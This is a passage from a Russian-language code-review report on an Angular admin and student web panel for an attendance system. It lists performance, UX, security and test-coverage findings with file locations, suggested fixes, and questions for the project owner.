- **Что:** это связано с **02 P0-1** (initial_password в БД и в response). Web-panel **отображает** пароль в открытой таблице админу и **копирует в clipboard через `copyPassword`** (`users-page.component.ts:230-246`). Это ухудшает 02 P0-1: пароль теперь не только в БД и в REST-ответе, но и **на экране админа**, в clipboard'е, потенциально — в скриншотах рабочего стола для документации.
- **Риск:** ПДн leak. Shoulder-surfing.
- **Как чинить:** после фикса 02 P0-1 (одноразовый токен setup_password) — эта колонка уйдёт автоматически. До тех пор — показывать только копию-кнопку без открытого текста, пароль никогда не рендерить как текст.

### P2-14: `HeadmanScheduleComponent` — `listSemesters()` → `listSubjects()` → `getGroupScheduleItems()` — водопад
- **Где:** `headman-schedule.component.ts:365-411`.
- **Что:** `loadActiveSemesterAndSchedule` ждёт `listSemesters`, затем `loadSchedule`. `loadSubjects` параллельно. Но `loadSchedule` может завершиться раньше `loadSubjects` → `subjectName(item.subjectId)` вернёт `Предмет #1` до того, как subjects загрузятся. Через пару сотен миллисекунд перерендерится — flicker.
- **Как чинить:** `forkJoin([semesters, subjects])` → потом `schedule`. Или template ждёт `loadingSubjects()` тоже.

### P2-15: `HeadmanLessonsComponent` — 14-дневный window фиксирован, не конфигурируем
- **Где:** `headman-lessons.component.ts:47`.
- **Что:** староста видит **только** ближайшие 14 дней. Если надо отменить пару через 3 недели — нельзя. Прошлые пары, которые нужно восстановить — тоже не видно.
- **Как чинить:** добавить навигацию «пред/след 14 дней» или слайдер диапазона.

### P2-16: `HeadmanWeeklyJournalComponent` скролл-позиция теряется при смене недели
- **Где:** `headman-weekly-journal.component.ts:249-265`.
- **Что:** при `nextWeek/prevWeek` — `loadWeek()` скидывает `statusMap`/`lessons`, шаблон перерисовывается, scroll прыгает в начало. На широкой таблице (30 студентов × 25 колонок) это раздражает.
- **Как чинить:** сохранять `scrollTop` в ref, восстанавливать в `afterNextRender`.

### P2-17: `StudentExcusesComponent` — `ensureLessonsLoaded` тянет 90-дневное окно `getWeekLessons` на каждое открытие тикета
- **Где:** `student-excuses.component.ts:125-157`.
- **Что:** пользователь смотрит список тикетов, тапает один → 90-дневный `GET /schedule/groups/{gid}/lessons`. Тапает второй → снова 90 дней (если lessonIds другие). Кэш `lessonCache` уменьшает дубли, но не предотвращает первый тяжёлый запрос на каждого из 3-5 тикетов.
- **Как чинить:** backend `GET /excuses/me` должен возвращать lesson details inline (как для старосты в `getGroupExcuses` с enrichLessons, только на стороне бэкенда).

### P2-18: `submitExcuseWithFile` выставляет `Content-Type: application/json` для JSON-части Blob'а — но не для всего multipart
- **Где:** `features/student/shared/student-api.service.ts:205-224`.
- **Что:** правильно — Blob имеет type=json, форма сама формирует boundary. Всё ок, в отличие от PWA (09 P1-11).

### P2-19: `HeadmanLessonsComponent.applyLocalUpdate` изменяет `cancelReason` в массиве signal'а по id, но не всегда получает обновлённые даты
- **Где:** `headman-lessons.component.ts:388, 425-427`.
- **Что:** после cancel/restore — локальное обновление, без перезагрузки. Если на backend есть триггер, который при cancel также пересоздаёт related записи — UI не узнает.
- **Как чинить:** после cancel/restore делать `load(groupId)` (лишние 200ms, но честно) или получать backend-обновлённую lesson в ответе PATCH.

### P2-20: `TeacherJournalPageComponent` не использует `forkJoin` для assignments+groups — nested subscribe anti-pattern
- **Где:** `features/teacher/journal/journal-page.component.ts:63-75`.
- **Что:** `getMyAssignments → subscribe → getGroups → subscribe` — nested subscribe. Правильно было бы `combineLatest` или `switchMap`. Также: если `getMyAssignments` выдаст ошибку, `getGroups` никогда не дёрнется, teacher увидит пустой селект без error message.
- **Как чинить:** `forkJoin({assignments, groups}).pipe(map(...))`.

---

## Мелкие и nit (P3)

### P3-1: `HeadmanPlaceholderComponent` — мёртвый код, маршрута нет

`features/headman/headman-placeholder/headman-placeholder.component.ts` — не импортирован ни в `app.routes.ts`, ни где-либо ещё. Внутри текст «появится в Фазе 54» (которая давно прошла). Удалить.

### P3-2: `HeadmanApiService.getPendingExcuses` дёргает `/api/academic/headman/excuses` — старый путь, не используется

Вызывается только из `HeadmanDashboardComponent` (не прочитан, но есть в imports сайдбара). На бэкенде такого пути нет (есть `/api/attendance/excuses/group/{gid}`). 404 на каждый заход.

### P3-3: `HeadmanGroupComponent` использует `*ngFor="let i of [1,2,3,4,5]"` для skeleton, но `[1,2,3,4,5]` — пересоздаётся каждый render

Мелкий перф-nit. `readonly SKELETON_ROWS = [1,2,3,4,5];` + `*ngFor="let i of SKELETON_ROWS"`.

### P3-4: `StudentDashboardComponent.ngOnInit` НЕ отписывает `setInterval` если компонент уничтожен до первого тика

Строго говоря, `destroyRef.onDestroy(() => clearInterval(tick))` есть. Всё ок, но тот же паттерн повторён в `AdminDashboardComponent` и `TeacherDashboardComponent` — дубль, можно вынести в `useClock()` helper.

### P3-5: `AuthService.currentUser()` — computed без `parseJwt` кэширования

Каждое обращение re-parses JWT (atob + JSON.parse). В шаблоне sidebar `currentUser()` дёргается десятки раз за change detection. Сейчас быстро, но можно кешировать в `signal`.

### P3-6: `app.routes.ts` — избыточные `canActivate: [headmanGuard]` на каждом child-routes

Родитель уже имеет `canActivate: [headmanGuard]`. Для каждого child ещё раз дублируется — тест с доступом отдельной страницы для non-headman отработает корректно, но двойная проверка избыточна.

### P3-7: В `login.component.ts` обработка 429 есть только для OTP, но не для password login

`onSubmit` (password) не отличает 429 (rate-limit auth-service) от прочих 5xx. 429 → «Ошибка сервера» — сбивает пользователя.

### P3-8: `sidebar.component.ts` содержит 250+ строк конфигурации nav-items inline — плохо для LOC

Вынести `allNavItems` в `sidebar.nav-items.ts` const.

### P3-9: `IOSOnboardingOverlay` (студ PWA-банер) показывается до логина в PWA (PWA 09 P2-15), в web-panel — не применимо. Проверено, ок.

### P3-10: `UserDialogComponent` — `(err as any)` cast

`features/admin/users/user-dialog/user-dialog.component.ts:44` — `errorStatus = (createAssistant.error as any)?.response?.status`. Правильно `err as HttpErrorResponse`. Технически то же поведение, но `any`-мины.

### P3-11: `AdminApiService` — `deleteSemester(id, confirmation)` шлёт body в DELETE — нестандартно

`features/admin/shared/admin-api.service.ts:145-149`. Body в DELETE — дискуссионно по HTTP-спеке, некоторые прокси/CDN режут его. Работает сейчас, но при CDN-layer добавлении может сломаться.

### P3-12: `headman-api.service.getTodayLessons` использует `new Date().toISOString().split('T')[0]` — UTC-зона, не локальная

`headman-api.service.ts:53` — в ночное время по МСК (UTC+3) после 21:00 возвращает **следующий** день. Фикс — использовать локальный `new Date()` + `formatDate` из `week-utils.ts`.

---

## Мёртвый код

- `features/headman/headman-placeholder/headman-placeholder.component.ts` — не используется (P3-1).
- `HeadmanApiService.getPendingExcuses` — endpoint `/api/academic/headman/excuses` на бэкенде отсутствует (P3-2); вызов в `HeadmanDashboardComponent` → всегда 404, graceful degradation скрывает.
- `AdminDashboardComponent.studentsSpark / teachersSpark / groupsSpark / activeGroupsSpark` — фейковые данные (P2-4); либо удалять, либо явно помечать.
- `shared/homework-card/homework-card.component.ts` (не читал, но судя по импортам — используется в одном месте) — возможный кандидат на consolidation.
- В `sidebar.component.ts` `allNavItems` есть `/student/homework` **и** в Headman блоке `/headman/homework` — ок, оба существуют, но могут быть объединены (P2-2).
- `profile/preset-avatars.ts` — не читал, предположу что список.

## Костыли и TODO/FIXME

- `main.ts:1-3` — `window.global = window` shim для sockjs-client. Правильно, но это workaround — `sockjs-client@1.6.1` устарел, стоит мигрировать на native WebSocket.
- `main.ts:11-29` — chunk-load recovery через `sessionStorage`. Хак, но грамотный (один reload, не бесконечный цикл).
- `auth.service.ts:83-110` — storage-listener для cross-tab sync. Хрупкое решение (не блокирует TOCTOU).
- `notification-center.service.ts:99-112` — `effect()` зависит от `currentUser()` целиком, включая токен — см. P1-7.
- `headman-lessons.component.ts:369` — `window.prompt` (P1-9).
- `HeadmanWeeklyJournalComponent.loadWeek:216-246` — N+1 через `forkJoin` без concurrency limit (P1-8).
- `admin-dashboard.component.ts:196-211` — `buildSpark` псевдо-данные (P2-4).
- `headman/shared/headman-api.service.ts` — `Observable<any>` повсюду (P2-8).
- `features/student/shared/student-stomp.service.ts:31-57` — декларативный комментарий про «never log URL», но URL всё равно попадает в nginx access.log (P0-2).
- `features/admin/users/users-page.component.ts:67-82` — комментарий `BUG-006-4 / D-14` про `initialPassword` visible-column — костыль поверх 02 P0-1 (P2-13).

## Тесты

### Что покрыто хорошо

- `authInterceptor.spec.ts` — 7 кейсов, queue concurrency covered (привет, PWA — тут лучше, чем там).
- `auth.service.spec.ts` (не читан детально, но существует).
- Все guards имеют `.spec.ts` (authGuard, roleGuard, studentGuard, headmanGuard, guestGuard).
- `theme.service.spec.ts`, `subject-cache.service.spec.ts`, `student-stomp.service.spec.ts`, `checkin-error-mapper.spec.ts`, `stats-utils.spec.ts`, `week-utils.spec.ts` — юнит-тесты чистых функций/сервисов.
- Админ-модуль: `users-page`, `groups-page`, `semesters`, `user-dialog`, `group-dialog`, `semester-dialog`, `promotion-preview-dialog`, `group-history-page`, `admin-dashboard`, `admin-api.service` — все имеют spec'и.
- Headman: `headman-excuses`, `headman-late-checkin`, `headman-journal-grid`, `headman-journal-page`, `headman-schedule`, `headman-lessons`, `headman-subjects` → `subject-dialog`, `headman-homework`, `homework-inline-form`, `headman-stats`, `one-off-dialog`, `schedule-slot-dialog`, `headman-api.service` — покрыты.
- Student: `student-dashboard`, `student-schedule`, `student-checkin`, `student-homework`, `student-excuses`, `student-late-checkin`, `student-notifications`, `redzone-warning`, `next-lesson-card`, `student-homework-day-view`, `student-homework-week-view`, `student-homework-month-view`, `lesson-row`, `student-api.service` — покрыты.
- Teacher: `journal-page`, `journal-grid`, `journal-cell`, `status-legend`, `overall-stat-card`, `subject-chart`, `stats-page`, `journal-api.service` — покрыты.

### Что покрыто плохо / не покрыто

- **`NotificationCenterService`** — нет unit-теста (критичный сервис на 220 строк, лайв-циклом STOMP управляет). Фактически лог в prod'е единственная защита от регрессий.
- **`NotificationBellComponent`** — нет spec (routing, markAllRead, relative time).
- **`ShellComponent`** — нет spec (navigating signal, progress bar).
- **`HeaderComponent`** — нет spec (route title extraction, profile dialog open).
- **`HeadmanGroupComponent`** — нет spec (assistant assign/delete flow).
- **`HeadmanWeeklyJournalComponent`** — нет spec (sticky columns, status save rollback).
- **`StudentPwaBannerComponent`** — нет spec (iOS detection, beforeinstallprompt).
- **`ProfileService / ProfileDialogComponent / AvatarComponent`** — нет spec.
- Запуск **интеграционных** тестов с STOMP-моками (только `student-stomp.service` покрыт).
- End-to-end flow «login → role redirect → load data» — нет.

### Некорректные/подозрительные тесты

- `auth.interceptor.spec.ts:25` — `NEW_ACCESS_TOKEN` == `ACCESS_TOKEN` (одинаковый payload). Если логика interceptor'а поломается и **вернёт старый токен после refresh** — тест не поймает.
- `student-stomp.service.spec.ts` (не читан детально) — вероятно аналогично 09 PWA: не проверяет reconnect-дедупликацию подписок (P1-6).
- `auth.service.spec.ts` payload включает `groupId` (camelCase), но backend кладёт `group_id` (snake_case). Тест может проходить, но реальный JWT не совпадает — та же история, что в PWA 09.

### Кандидаты на удаление/рефакторинг

- `HeadmanPlaceholderComponent` — и сам компонент, и соответствующий spec (если есть).
- Дубликаты skeleton-стилей в ~5 компонентах — вынести общий `<app-skeleton-row>`.

---

## Соответствие CLAUDE.md

Правила CLAUDE.md жёстко применимы только к backend; для web-panel:

- **REST пути `/api/...`:** ✅ все через `HttpClient` с абсолютным префиксом.
- **TIMESTAMPTZ/LocalDate:** ✅ web-panel корректно отличает `YYYY-MM-DD` (schedule/homework dates) и ISO-datetime (`receivedAt`, `createdAt`).
- **Enum lowercase в payload-ах:** ✅ status-значения приходят в lowercase, отправляются в lowercase (`present`/`absent`/...), `role` — **в JWT** пишется UPPER/mixed case, `auth.service.ts:68` делает `.toUpperCase()` в UI. Смешение `STUDENT`/`student` — см. backend 02 P2; web-panel принимает оба, форсит UPPER_CASE.
- **HATEOAS:** ✅ web-panel распаковывает `_embedded.xxx` defensive-ly (`Object.values(embedded)[0]`). Но это означает, что **рассинхрон имени ключа** с backend не ловится компилятором — та же проблема `subjectCache` и `journalCellList` обсуждалась в 09 PWA.
- **Contract-first:** ⚠ типы DTO дублируются в `features/admin/shared/types.ts`, `features/student/shared/student-schedule.types.ts`, `features/teacher/journal/types.ts`, `features/headman/excuses/excuse.types.ts`, `features/headman/late-checkin/late-checkin.types.ts`. Согласованность с backend-DTO держится на honor system.
- **Soft delete:** ✅ admin-user archive через `status: 'archived'` (status enum). Восстановление через `status: 'active'` — `users-page.component.ts:247-256`.

Главный gap — **отсутствие OpenAPI-generator**. Backend-сервисы экспонируют `/v3/api-docs`, но web-panel не генерит types из них. Это приводит к дрейфу (см. P2-7, P2-8).

---

## Зависимости между проблемами

- **P0-1 (localStorage JWT) + P0-2 (WS token в URL) + 09 PWA P0-1/P0-2** — один фикс (HttpOnly cookie + WS ticket) закрывает 4 issue в двух фронтах.
- **P0-3 (нет CSP) + 09 PWA P1-3** — общий nginx-фикс. Можно даже shared-include.
- **P0-4 (sessionStorage notifications не чистятся) + 09 PWA P0-4** — общая проблема lifecycle при logout.
- **P1-5 (3 STOMP-клиента) + 09 PWA P1-4** — консолидация в один NotificationCenter одновременно в двух фронтах.
- **P1-8 (weekly-journal N-запросов) + 04 attendance-service** — bulk endpoint в attendance решает обе.
- **P1-14 (excuses enrich N+M) + 04 attendance-service** — `GET /excuses/group/{gid}` должен возвращать inline lessons.
- **P2-13 (initialPassword в admin UI) + 02 academic-service P0-1 + 01 auth-service P0-2** — одна корневая (plain password), три следствия в трёх отчётах.
- **P1-15 (логика `center.onEvent$`) + 05 notification-service** — фронт корректно полагается на backend-фильтр по topic'ам; любое ослабление правил broker'а (05 P1) сразу ломает web-panel.

---

## Вопросы к владельцу проекта

1. ✅ **HttpOnly cookie для refresh-токена** (P0-1). Готовы к миграции, включающей auth-service (endpoint refresh меняет поведение: тело → cookie), api-gateway (CORS `credentials: true`), web-panel (`withCredentials: true`), PWA (тот же), mini-app?
   → **AUTO-RESOLVED через 02-Q-frontend-security (2026-04-18)**: ДА, breaking change без двойных endpoint'ов. См. `OWNER-ANSWERS.md`.
2. ✅ **WS-ticket endpoint** (P0-2). Добавляем `POST /auth/ws-ticket` → 60s opaque ticket → `/api/ws?ticket=...`?
   → **AUTO-RESOLVED через 02-Q-frontend-security (2026-04-18)**: ДА. См. `OWNER-ANSWERS.md`.
3. **Admin promote group** (P1-10). Включить `Idempotency-Key` header + подтверждение через ввод слова PROMOTE?
4. **`/admin/dashboard` sparkline-графики** (P2-4) — оставить псевдо-данные с подписью «демо», убрать, или добавить настоящий endpoint `/dashboard/trends`?
5. **Один STOMP-клиент вместо трёх** (P1-5) — рефактор через `NotificationCenterService.onEvent$`? Сократит bundle и нагрузку на notification-service.
6. **Дубликат «Главная»/«Кабинет старосты»** (P2-1) — что оставить для старосты в sidebar?
7. ✅ **`/admin/users` показывает `initialPassword` в таблице** (P2-13) — убирать после фикса 02 P0-1, или есть текущая необходимость показывать?
   → **ACCEPTED BY OWNER (2026-04-18)**: колонка остаётся как заявленная фича. См. `OWNER-ANSWERS.md` 10-Q7.
8. **CSP strict-script** (P0-3) — проверить, что Chart.js / Angular Material / sockjs-client не нуждаются в `'unsafe-eval'` / inline-script. Готов ли прогнать e2e в preview с жёсткой CSP?
9. **Backend bulk-endpoints** для weekly-journal (P1-8) и excuses-enrich (P1-14) — добавляем? Сильно ускорит headman UX.
10. **`/headman/lessons` 14-дневный window** (P2-15) — расширяем до произвольного диапазона?
11. **Генерация TypeScript-types из OpenAPI** — когда внедряем? Без этого `Observable<any>` в headman-api будет копить долг.
12. **Удаление `HeadmanPlaceholderComponent`** (P3-1) — подтвердить, что безопасно?
